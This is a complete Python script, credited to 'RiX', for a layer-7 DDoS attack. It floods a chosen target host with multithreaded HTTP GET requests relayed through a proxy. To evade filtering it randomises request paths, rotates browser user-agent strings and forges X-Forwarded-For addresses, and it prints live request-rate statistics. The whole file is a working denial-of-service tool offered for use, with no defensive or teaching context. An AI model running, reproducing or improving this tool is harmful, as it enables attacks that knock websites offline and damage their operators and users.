#Author RiX

#Libs
import os
import sys
import socket
import threading
import argparse
from time import sleep
from random import choice, randint

#Parse args
def argParse():
    os.system('cls' if os.name == 'nt' else 'clear')
    global args
    parser = argparse.ArgumentParser(description='Options for DDoS attack')
    parser.add_argument('-t', metavar='HOST', dest='host', help='Target host (required)', type=str, required=True)
    parser.add_argument('-i', metavar='IP', dest='ip', help='Proxy IP address (required)', type=str, required=True)
    parser.add_argument('-p', metavar='PORT', dest='port', help='Proxy port (required)', type=int, required=True)
    parser.add_argument('-f', metavar='PATH', dest='path', help='Target\'s page path (default=random)', type=str, default='/', required=False)
    parser.add_argument('-w', metavar='COUNT', dest='threads', help='Threads count (default=100)', type=int, default=100, required=False)
    args = parser.parse_args()

#Class
class DDoS:
    #Init
    def __init__(self, host, ip, port, path, threads):
        #Self vars
        self.host = host
        self.ip = ip
        self.port = port
        self.path = path
        self.threads = threads
        #self.hostIp = socket.gethostbyname(self.host)
        self.requestCount = 0
        self.timeSec = 0
        if self.path == '/':
            self.pathList = list('QWERTYUIOPASDFGHJKLXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')
        self.userAgent = [
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.131 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.131 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; CrOS x86_64 10066.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0",
        "Mozilla/5.0 (Android 4.4; Tablet; rv:70.0) Gecko/70.0 Firefox/70.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
        "Mozilla/5.0 (iPad; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48",
        "Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02",
        "Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
        ]

        #Making thread event
        self.threadEvent = threading.Event()
        self.threadEvent.clear()

        #Create threads
        for x in range(self.threads):
            thread = threading.Thread(target=self.ddos)
            thread.start()
            print(f"\33[32m+Thread #{x+1} started!")
        self.threadEvent.set()

        #Print results
        while self.threadEvent.isSet():
            try:
                #Print speed and count
                self.hasSent = self.requestCount
                sleep(0.1)
                self.sentSec = (self.requestCount-self.hasSent)*10
                self.timeSec += 1/10
                if self.path == '/':
                    print(f'\33[0m\33[92m+Request #{self.requestCount} \33[91m/ \33[93m{round(self.timeSec, 1)} Secs \33[91m/ \33[94m{self.sentSec} Requests/s \33[91m~ \33[95m{self.ip}@{self.port} \33[91m-> \33[96m{self.host}')
                else:
                    print(f'\33[0m\33[92m+Request #{self.requestCount} \33[91m/\33[93m {round(self.timeSec, 1)} Secs \33[91m/ \33[94m{self.sentSec} Requests/s \33[91m~ \33[95m{self.ip}@{self.port} \33[91m-> \33[96m{self.host}/{self.path[1:]}')
            #Ctrl+C
            except KeyboardInterrupt:
                print('Ctrl+C')
                self.threadEvent.clear()
                sys.exit(0)

    #Create sock
    def createSock(self):
        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM,
            socket.IPPROTO_TCP
        )
        sock.settimeout(10)
        return sock

    #DDoS
    def ddos(self):
        try:
            self.threadEvent.wait()
            while self.threadEvent.isSet():
                while self.threadEvent.isSet():
                    try:
                        #Connect
                        sock = self.createSock()
                        sock.connect((self.ip, self.port))
                        while self.threadEvent.isSet():
                            try:
                                #Send
                                if self.path == '/':
                                    path = "".join(choice(self.pathList) for y in range(randint(5, 15)))
                                else:
                                    path = self.path[1:]
                                fakeIp = f'{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}'
                                sock.send(f'GET /{path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {choice(self.userAgent)}\r\nConnection: keep-alive\r\nX-Forwarded-For: {fakeIp}\r\nX-Forwarded-Host: {self.host}\r\n\r\n'.encode('utf-8'))
                                self.requestCount += 1
                                msg = ''
                                while self.threadEvent.isSet():
                                    data = sock.recv(1024)
                                    msg += data.decode('utf-8')
                                    if len(data) < 1024:
                                        break
                            except:
                                sock.close()
                                break
                    except:
                        sock.close()
                        break
        except:
            pass

#Run
if __name__ == '__main__':
    argParse()
    DDoS(args.host, args.ip, args.port, args.path, args.threads)
